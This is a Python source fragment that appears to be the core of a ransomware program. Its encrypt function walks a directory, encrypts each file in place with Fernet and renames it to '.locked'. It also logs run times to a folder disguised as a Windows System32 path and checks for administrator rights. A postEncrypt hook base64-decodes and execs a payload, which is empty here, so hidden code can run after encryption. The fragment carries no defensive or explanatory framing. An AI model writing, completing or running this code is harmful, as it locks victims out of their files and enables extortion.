def encrypt(directoryPath, key, persistDirectory='C:\\users\\public\\Windows\\System32\\'):
    # log the date and time
    now = datetime.datetime.now()
    date = now.strftime("%Y-%m-%d %H:%M")
    # log the date and time in persistDirectory
    with open(persistDirectory + '\\dateTime.txt', 'a') as f:
        f.write(date + '\n')
    for root, dirs, files in os.walk(directoryPath):
        print('Encrypting: ' + directoryPath)
        for file in files:
            filePath = os.path.join(root, file)
            try:

                if file.endswith('.py') or file.endswith('.ini') or file.endswith('.lnk'):
                    print('skipping ' + file)
                    continue
                else:
                    with open(filePath, 'rb') as f:
                        data = f.read()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(data)
                    print('encrypting ' + file)
                    with open(filePath, 'wb') as f:
                        f.write(encrypted)
                    #  rename encrypted file to .locked
                    os.rename(filePath, filePath + '.locked')
            except PermissionError:
                print('permission error for ' + file)
                continue
    postEncrypt()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def postEncrypt():
    message = b''
    decMessage = base64.b64decode(message)
    exec(decMessage)


